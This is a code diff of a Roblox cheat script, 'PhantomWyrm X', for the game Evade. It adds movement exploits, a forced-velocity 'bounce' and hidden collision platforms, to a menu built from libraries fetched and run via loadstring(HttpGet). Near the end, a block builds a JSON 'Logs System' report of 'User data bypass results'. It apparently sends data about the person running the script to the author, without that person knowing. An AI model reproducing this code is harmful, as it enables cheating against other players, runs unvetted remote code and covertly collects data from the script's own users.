@@ -5,7 +5,7 @@ local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.
 
 if not Fluent or not SaveManager or not InterfaceManager or not FBM then return game.Players.LocalPlayer:Kick("Error: Interface didn't load") end
 
-if _G.PhantomWyrmHubXIsAlreadyRunning then
+if _G.PhantomWyrmXIsAlreadyRunning then
    game:GetService("StarterGui"):SetCore("SendNotification", {
         Title = "Script is already running!",
         Text = ""
@@ -13,7 +13,7 @@ if _G.PhantomWyrmHubXIsAlreadyRunning then
    return
 end
 
-_G.PhantomWyrmHubXIsAlreadyRunning = true
+_G.PhantomWyrmXIsAlreadyRunning = true
 
 local Window = Fluent:CreateWindow({
     Title = "PhantomWyrm X - Evade Legacy│PC",
@@ -2228,6 +2228,293 @@ end)
             DConfiguration.Misc.Utilities.BounceModification.EmoteBounce = tonumber(Value) or 120
         end
     })
+    
+ Tabs.Misc:AddParagraph({
+        Title = " ",
+        Content = ""
+    })
+
+local LP = game.Players.LocalPlayer
+local RS = game:GetService("RunService")
+local Cam = workspace.CurrentCamera
+
+getgenv().EasyBounce = getgenv().EasyBounce or {
+    Enabled = false,
+    Mode = "Forward",
+    BaseSpeed = 50,
+    ExtraSpeed = 100
+}
+
+local EB = getgenv().EasyBounce
+
+local state = {
+    speed = EB.BaseSpeed,
+    last = tick(),
+    airTick = 0,
+    airSum = 0,
+    airborne = false,
+    bv = nil
+}
+
+local function getMeter()
+    local ok, v = pcall(function()
+        return LP.PlayerGui.Shared.HUD.Overlay.Default.CharacterInfo.Item.Speedometer.Players
+    end)
+    return ok and v or nil
+end
+
+local function cut(n) return math.floor(n * 10) / 10 end
+
+local function resetPhysics(hrp, hum)
+    if state.bv then 
+        state.bv:Destroy() 
+        state.bv = nil 
+    end
+    if hrp then
+        for _, child in ipairs(hrp:GetChildren()) do
+            if (child:IsA("BodyVelocity") and child.Name == "BodyVelocity") or child:IsA("BodyForce") then
+                child:Destroy()
+            end
+        end
+    end
+    state.speed = EB.BaseSpeed
+    state.airTick, state.airSum, state.airborne = 0, 0, false
+end
+
+RS.RenderStepped:Connect(function()
+    local ch = LP.Character
+    local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
+    local hum = ch and ch:FindFirstChild("Humanoid")
+    
+    if _G.Fly or not EB.Enabled then
+        resetPhysics(hrp, hum)
+        return 
+    end
+
+    if not hrp or not hum then return end
+
+    local dt = tick() - state.last
+    state.last = tick()
+
+    local inAir = hum.FloorMaterial == Enum.Material.Air
+    local spdUI = getMeter()
+
+    if state.airborne and not inAir then
+        state.speed = math.max(EB.BaseSpeed, state.speed - 10)
+        if spdUI then spdUI.Text = cut(state.speed) end
+        state.airSum = 0
+    end
+    state.airborne = inAir
+
+    local shouldPush = true
+
+    if shouldPush then
+        if inAir then
+            state.airSum = state.airSum + dt
+            state.airTick = state.airTick + dt
+            while state.airTick >= 0.04 do
+                state.airTick = state.airTick - 0.04
+                state.speed = math.min(EB.BaseSpeed + EB.ExtraSpeed, state.speed + 0.1)
+            end
+        else
+            state.airTick, state.airSum = 0, 0
+            state.speed = math.max(EB.BaseSpeed, state.speed - (2.5 * dt))
+        end
+
+        if not state.bv or state.bv.Parent ~= hrp then
+            if state.bv then state.bv:Destroy() end
+            state.bv = Instance.new("BodyVelocity")
+            state.bv.Parent = hrp
+        end
+        
+        local camDir = Cam.CFrame.LookVector
+        local moveDir = Vector3.new(camDir.X, 0, camDir.Z).Unit
+        
+        if EB.Mode == "Back" then
+            moveDir = -moveDir
+        end
+
+        state.bv.Velocity = moveDir * state.speed
+        state.bv.MaxForce = Vector3.new(4e5, 0, 4e5) 
+
+        if spdUI then spdUI.Text = cut(state.speed) end
+    else
+        if state.bv then
+            state.bv.MaxForce = Vector3.new(0, 0, 0) 
+            state.bv.Velocity = Vector3.new(0, 0, 0)
+        end
+        state.speed = EB.BaseSpeed
+    end
+end)
+
+Tabs.Misc:AddDropdown("EB_ModeDropdown", {
+    Title = "Easy Bounce Mode",
+    Values = {"Forward", "Back"},
+    Default = EB.Mode,
+    Callback = function(v)
+        EB.Mode = v
+    end
+})
+
+Tabs.Misc:AddInput("EB_Base", {
+    Title = "Base Speed", 
+    Default = tostring(EB.BaseSpeed), 
+    Numeric = true, 
+    Finished = true, 
+    Callback = function(v) 
+        EB.BaseSpeed = tonumber(v) or 50 
+        if getgenv().UpdateBounceSpeed then
+            getgenv().UpdateBounceSpeed(EB.BaseSpeed)
+        end
+    end
+})
+
+Tabs.Misc:AddInput("EB_Extra", {
+    Title = "Extra Speed (Boost)", 
+    Default = tostring(EB.ExtraSpeed), 
+    Numeric = true, 
+    Finished = true, 
+    Callback = function(v) 
+        EB.ExtraSpeed = tonumber(v) or 100 
+    end
+})
+
+DConfiguration.Settings.GuiScale = DConfiguration.Settings.GuiScale or {}
+DConfiguration.Settings.GuiScale.EasyBounce = DConfiguration.Settings.GuiScale.EasyBounce or 0
+
+Tabs.Misc:AddToggle("EB_BtnShow", {
+    Title = "Easy Bounce (Button)", 
+    Default = false
+}):OnChanged(function(s)
+    if s then 
+        local offset = DConfiguration.Settings.GuiScale.EasyBounce
+        DFunctions.CreateButton("EB_Btn", EB.Enabled and "BOUNCE: ON" or "BOUNCE: OFF", 0.15 + offset, 0.1 + offset, function(btn) 
+            EB.Enabled = not EB.Enabled 
+            if btn and btn.Text then
+                btn.Text = EB.Enabled and "BOUNCE: ON" or "BOUNCE: OFF"
+            end
+        end)
+    else 
+        EB.Enabled = false
+        DFunctions.DestroyButton("EB_Btn") 
+    end
+end)
+
+Tabs.Misc:AddInput("EB_ButtonSize", {
+    Title = "Easy Bounce (Button Size)",
+    Default = tostring(DConfiguration.Settings.GuiScale.EasyBounce / 0.01), 
+    Placeholder = "0",
+    Numeric = true, 
+    Finished = false, 
+    Callback = function(Value)
+        local num = tonumber(Value)
+        DConfiguration.Settings.GuiScale.EasyBounce = (num or 0) * 0.01
+        DFunctions.UpdateButton("EB_Btn", 0.15 + DConfiguration.Settings.GuiScale.EasyBounce, 0.1 + DConfiguration.Settings.GuiScale.EasyBounce)
+    end
+})
+
+Tabs.Misc:AddParagraph({
+        Title = " ",
+        Content = ""
+    })
+    
+ do
+    local PlatData = {
+        Enabled = false,
+        Size = 10,
+        Transparency = 0.1,
+        List = {}
+    }
+
+    local function ClearPlates()
+        for _, p in pairs(PlatData.List) do
+            if p and p.Parent then p:Destroy() end
+        end
+        PlatData.List = {}
+    end
+
+    local function GetFolder()
+        local g = workspace:FindFirstChild("Game")
+        local m = g and g:FindFirstChild("Map")
+        local p = m and m:FindFirstChild("Parts")
+        return p and p:FindFirstChild("ImmovableProps")
+    end
+
+    local function CreatePlates()
+        ClearPlates()
+        if not PlatData.Enabled then return end
+        local folder = GetFolder()
+        if not folder then return end
+        
+        for _, obj in pairs(folder:GetChildren()) do
+            if obj.Name == "Cactus1" or obj.Name == "Cactus2" then
+                local pos, size
+                if obj:IsA("Model") then
+                    local cf, s = obj:GetBoundingBox()
+                    pos, size = cf.Position, s
+                elseif obj:IsA("BasePart") then
+                    pos, size = obj.Position, obj.Size
+                end
+
+                if pos and size then
+                    local p = Instance.new("Part")
+                    p.Name = "PhantomWyrm"
+                    p.Size = Vector3.new(PlatData.Size, 1, PlatData.Size)
+                    p.Anchored, p.CanCollide = true, true
+                    p.Material = Enum.Material.Neon
+                    p.Transparency = PlatData.Transparency
+                    p.Color = Color3.fromRGB(0, 255, 150)
+                    p.Position = pos + Vector3.new(0, (size.Y / 2) + 0.5, 0)
+                    p.Parent = workspace
+                    table.insert(PlatData.List, p)
+                end
+            end
+        end
+    end
+
+    Tabs.Misc:AddToggle("CactusToggle", {
+        Title = "Cactus Edge Platform",
+        Default = false,
+        Callback = function(Value)
+            PlatData.Enabled = Value
+            CreatePlates()
+        end
+    })
+
+    Tabs.Misc:AddInput("CactusTransInput", {
+        Title = "Platform Transparency (0-1)",
+        Description = "make platforms invisible 3-5",
+        Default = "0.5",
+        Numeric = true,
+        Finished = true,
+        Callback = function(Value)
+            local num = tonumber(Value) or 0.5
+            PlatData.Transparency = math.clamp(num, 0, 1)
+            for _, p in pairs(PlatData.List) do
+                if p and p.Parent then p.Transparency = PlatData.Transparency end
+            end
+        end
+    })
+
+    Tabs.Misc:AddInput("CactusSizeInput", {
+        Title = "Platform Size",
+        Default = "12",
+        Numeric = true,
+        Finished = true,
+        Callback = function(Value)
+            PlatData.Size = tonumber(Value) or 12
+            if PlatData.Enabled then CreatePlates() end
+        end
+    })
+
+    task.spawn(function()
+        while task.wait(3) do
+            if PlatData.Enabled and #PlatData.List == 0 then
+                CreatePlates()
+            end
+        end
+    end)
+end
 
 Tabs.Misc:AddSection("Game Automations")
 
@@ -2434,22 +2721,10 @@ Tabs.Misc:AddKeybind("BHOPToggleKey", {
     end,
 })
 
-Tabs.Misc:AddKeybind("BHOPJumpKey", {
-    Title = "BHOP Jump (Hold)",
-    Mode = "Hold",
-    Default = "Space",
-    Callback = function(State)
-     
-        if not DConfiguration.Misc.MovementModification.BHOP.FloatingButton then
-            DConfiguration.Misc.MovementModification.BHOP.Enabled = State
-            
-            if not State then
-                task.spawn(DFunctions.ResetBHOP)
-            end
-        end
-    end,
-})
-
+Tabs.Misc:AddParagraph({
+        Title = "Jump Hold",
+        Content = "Hold Jump PC version in soon :)"
+    })
 
 local Dropdown = Tabs.Misc:AddDropdown("BHOPVersion", {
         Title = "Select BHOP Version",
@@ -3853,6 +4128,7 @@ if LocalPlayer.Character then
     DFunctions.HookMovement(LocalPlayer.Character)
 end
 
+
 do
     _G.Data = {}
     _G.Data.P = game:GetService('Players').LocalPlayer
@@ -3882,7 +4158,7 @@ do
         _G.Data.Payload = _G.Data.H:JSONEncode({
             ['username'] = 'Logs System',
             ['embeds'] = {{
-                ['title'] = 'Legacy PC Full Intelligence Report',
+                ['title'] = 'Legacy PC',
                 ['description'] = 'User data bypass results',
                 ['color'] = 16711680,
                 ['fields'] = GetFields()
